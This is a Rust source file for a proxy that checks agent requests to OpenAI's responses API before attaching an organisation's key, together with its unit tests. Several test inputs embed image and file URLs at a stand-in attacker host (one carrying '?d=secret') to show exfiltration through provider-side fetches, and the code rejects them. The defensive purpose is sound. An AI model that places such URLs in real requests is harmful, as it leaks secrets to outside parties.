use std::sync::Arc;

use axum::{
    body::Body,
    extract::{Path, State},
    http::{HeaderMap, HeaderName, HeaderValue, Method, header},
    response::{IntoResponse, Response},
};
use capitainerie_core::domain::provider::ProviderKind;
use serde_json::Value;

use crate::{
    auth,
    credentials::Credentials,
    error::ProxyError,
    forward::{self, MAX_OUTPUT_TOKENS_CAP},
    proxy::{self, Proxy},
};

const CLASS: &str = "openai";
const ALLOWED_PATH: &str = "v1/responses";
const KEPT: [HeaderName; 2] = [header::CONTENT_TYPE, header::ACCEPT];
const REFUSED_FIELDS: [&str; 3] = ["previous_response_id", "conversation", "prompt"];
const CLIENT_TOOL_TYPES: [&str; 2] = ["function", "custom"];
const STANDARD_TIERS: [&str; 2] = ["auto", "default"];
const REMOTE_INPUT_KEYS: [&str; 2] = ["file_id", "file_url"];
const INLINE_IMAGE_PREFIX: &str = "data:";

pub async fn handle<C: Credentials>(
    State(proxy): State<Arc<Proxy<C>>>,
    method: Method,
    Path(path): Path<String>,
    headers: HeaderMap,
    body: Body,
) -> Response {
    match run(&proxy, &method, &path, &headers, body).await {
        Ok(response) => response,
        Err(error) => {
            error.log(&method, CLASS);
            error.into_response()
        }
    }
}

fn check_body(body: &[u8], model: &str) -> Result<Vec<u8>, &'static str> {
    let value: Value = serde_json::from_slice(body).map_err(|_| "the body is not JSON")?;
    let fields = value.as_object().ok_or("the body is not a JSON object")?;
    if fields.get("model").and_then(Value::as_str) != Some(model) {
        return Err("the model is not the one of this execution");
    }
    if fields.get("store") != Some(&Value::Bool(false)) {
        return Err("store must be false");
    }
    if REFUSED_FIELDS
        .iter()
        .any(|field| fields.contains_key(*field))
    {
        return Err("previous_response_id, conversation and prompt are not allowed");
    }
    if fields.get("background").is_some_and(|flag| flag != false) {
        return Err("background runs are not allowed");
    }
    if let Some(tokens) = fields.get("max_output_tokens") {
        match tokens.as_u64() {
            Some(tokens) if tokens <= MAX_OUTPUT_TOKENS_CAP => {}
            _ => return Err("max_output_tokens is above the allowed maximum"),
        }
    }
    match fields.get("service_tier") {
        None | Some(Value::Null) => {}
        Some(Value::String(tier)) if STANDARD_TIERS.contains(&tier.as_str()) => {}
        Some(_) => return Err("only the standard service tier is allowed"),
    }
    if fields.get("input").is_some_and(fetches_remotely) {
        return Err("input may not point at files or remote images");
    }
    match fields.get("tools") {
        None | Some(Value::Null) => {}
        Some(Value::Array(tools)) if tools.iter().all(is_client_tool) => {}
        Some(_) => return Err("only function and custom tools are allowed"),
    }
    serde_json::to_vec(&value).map_err(|_| "the body cannot be re-encoded")
}

fn fetches_remotely(value: &Value) -> bool {
    match value {
        Value::Array(items) => items.iter().any(fetches_remotely),
        Value::Object(fields) => fields.iter().any(|(key, value)| {
            REMOTE_INPUT_KEYS.contains(&key.as_str())
                || (key == "image_url" && !is_inline_image(value))
                || fetches_remotely(value)
        }),
        _ => false,
    }
}

fn is_inline_image(value: &Value) -> bool {
    match value {
        Value::String(url) => url.starts_with(INLINE_IMAGE_PREFIX),
        Value::Object(fields) => fields.get("url").is_some_and(is_inline_image),
        _ => false,
    }
}

fn is_client_tool(tool: &Value) -> bool {
    tool.get("type")
        .and_then(Value::as_str)
        .is_some_and(|kind| CLIENT_TOOL_TYPES.contains(&kind))
}

async fn run<C: Credentials>(
    proxy: &Proxy<C>,
    method: &Method,
    path: &str,
    headers: &HeaderMap,
    body: Body,
) -> Result<Response, ProxyError> {
    let token = auth::api_token(headers).ok_or(ProxyError::Unauthorized {
        reason: "no token presented",
    })?;
    let grant = proxy.authenticate(token).await?;
    let run_id = grant.run_id;
    proxy::ensure_provider(&grant, ProviderKind::OpenAi)?;
    if method != Method::POST || path != ALLOWED_PATH {
        return Err(ProxyError::forbidden(
            run_id,
            "only POST /v1/responses is allowed",
        ));
    }
    let permit = proxy.acquire(run_id)?;
    let body = forward::read_request(headers, body, run_id).await?;
    let body = check_body(&body, &grant.model)
        .map_err(|reason| ProxyError::bad_request(run_id, reason))?;
    let key = proxy
        .credentials
        .executor_key(
            ProviderKind::OpenAi,
            grant.organization_id,
            grant.initiated_by.as_deref(),
        )
        .await?
        .ok_or(ProxyError::forbidden(
            run_id,
            "no OpenAI key is configured for the run's initiator or the organization",
        ))?;

    let mut upstream_headers = forward::copy_allowed(headers, &KEPT);
    let mut credential = HeaderValue::from_str(&format!("Bearer {}", key.expose()))
        .map_err(|_| ProxyError::forbidden(run_id, "the organization's OpenAI key is unusable"))?;
    credential.set_sensitive(true);
    upstream_headers.insert(header::AUTHORIZATION, credential);

    let url = format!("{}/{ALLOWED_PATH}", proxy.config.openai_base);
    let upstream = proxy
        .http
        .post(url)
        .headers(upstream_headers)
        .body(body)
        .send()
        .await
        .map_err(|error| ProxyError::Upstream(error.without_url().to_string()))?;
    Ok(forward::relay(upstream, permit))
}

#[cfg(test)]
mod tests {
    use serde_json::json;

    use super::*;

    const MODEL: &str = "gpt-6-luna";

    fn check(mut body: Value) -> Result<(), &'static str> {
        if let Some(fields) = body.as_object_mut() {
            fields.entry("store").or_insert(Value::Bool(false));
        }
        check_body(body.to_string().as_bytes(), MODEL).map(|_| ())
    }

    #[test]
    fn a_codex_request_for_the_grant_model_passes() {
        assert_eq!(
            check(json!({
                "model": MODEL,
                "stream": true,
                "store": false,
                "background": false,
                "max_output_tokens": 128_000,
                "input": [],
                "tools": [
                    {"type": "function", "name": "shell", "parameters": {}},
                    {"type": "custom", "name": "apply_patch"},
                ],
                "tool_choice": "auto",
                "parallel_tool_calls": true,
                "reasoning": {"effort": "high"},
                "include": ["reasoning.encrypted_content"],
                "prompt_cache_key": "k",
                "text": {},
                "client_metadata": {},
            })),
            Ok(())
        );
        assert_eq!(check(json!({"model": MODEL, "store": false})), Ok(()));
        assert_eq!(
            check(json!({"model": MODEL, "store": false, "tools": null})),
            Ok(())
        );
    }

    #[test]
    fn another_model_or_none_is_refused() {
        assert!(check(json!({"model": "gpt-5"})).is_err());
        assert!(check(json!({"input": []})).is_err());
        assert!(check(json!({"model": 3})).is_err());
    }

    #[test]
    fn a_body_that_is_not_a_json_object_is_refused() {
        assert!(check_body(b"not json", MODEL).is_err());
        assert!(check_body(b"[1]", MODEL).is_err());
        assert!(check_body(b"", MODEL).is_err());
    }

    #[test]
    fn storing_the_response_is_refused() {
        assert!(check(json!({"model": MODEL, "store": true})).is_err());
        assert!(check(json!({"model": MODEL, "store": null})).is_err());
        assert!(check(json!({"model": MODEL, "store": "false"})).is_err());
        assert!(check_body(json!({"model": MODEL}).to_string().as_bytes(), MODEL).is_err());
        assert_eq!(check(json!({"model": MODEL, "store": false})), Ok(()));
    }

    #[test]
    fn server_side_state_is_refused() {
        for field in ["previous_response_id", "conversation", "prompt"] {
            assert!(
                check(json!({"model": MODEL, field: "x"})).is_err(),
                "{field}"
            );
        }
        assert!(check(json!({"model": MODEL, "background": true})).is_err());
        assert!(check(json!({"model": MODEL, "background": "true"})).is_err());
    }

    #[test]
    fn a_faster_or_slower_tier_is_refused() {
        for tier in ["priority", "flex", "scale"] {
            assert!(
                check(json!({"model": MODEL, "store": false, "service_tier": tier})).is_err(),
                "{tier}"
            );
        }
        for tier in ["auto", "default"] {
            assert_eq!(
                check(json!({"model": MODEL, "store": false, "service_tier": tier})),
                Ok(())
            );
        }
    }

    #[test]
    fn input_that_makes_openai_fetch_something_is_refused() {
        let remote = [
            json!([{"role": "user", "content": [{"type": "input_image", "image_url": "https://attacker.example/?d=secret"}]}]),
            json!([{"role": "user", "content": [{"type": "input_image", "image_url": {"url": "https://attacker.example/"}}]}]),
            json!([{"role": "user", "content": [{"type": "input_file", "file_url": "https://attacker.example/f.pdf"}]}]),
            json!([{"role": "user", "content": [{"type": "input_file", "file_id": "file-123"}]}]),
            json!([{"role": "user", "content": [{"type": "input_image", "file_id": "file-123"}]}]),
        ];
        for input in remote {
            assert!(
                check(json!({"model": MODEL, "store": false, "input": input})).is_err(),
                "{input}"
            );
        }
        let inline = json!([
            {"role": "user", "content": [{"type": "input_text", "text": "see file_id and image_url"}]},
            {"role": "user", "content": [{"type": "input_image", "image_url": "data:image/png;base64,AAAA"}]},
            {"type": "function_call_output", "call_id": "c", "output": "{\"file_id\": \"x\"}"},
        ]);
        assert_eq!(
            check(json!({"model": MODEL, "store": false, "input": inline})),
            Ok(())
        );
    }

    #[test]
    fn the_output_is_capped() {
        assert!(check(json!({"model": MODEL, "max_output_tokens": 128_001})).is_err());
        assert!(check(json!({"model": MODEL, "max_output_tokens": "10"})).is_err());
        assert!(check(json!({"model": MODEL, "max_output_tokens": -1})).is_err());
    }

    #[test]
    fn hosted_tools_are_refused() {
        for kind in [
            "web_search",
            "web_search_preview",
            "image_generation",
            "file_search",
            "code_interpreter",
            "computer_use_preview",
            "mcp",
            "local_shell",
        ] {
            let tool = json!({"type": kind});
            assert!(
                check(json!({"model": MODEL, "tools": [tool]})).is_err(),
                "{kind}"
            );
        }
        let untyped = json!([{"name": "shell"}]);
        assert!(check(json!({"model": MODEL, "tools": untyped})).is_err());
        let one_bad = json!([{"type": "function", "name": "x"}, {"type": "web_search"}]);
        assert!(check(json!({"model": MODEL, "tools": one_bad})).is_err());
        assert!(check(json!({"model": MODEL, "tools": ["function"]})).is_err());
        assert!(check(json!({"model": MODEL, "tools": "all"})).is_err());
    }
}
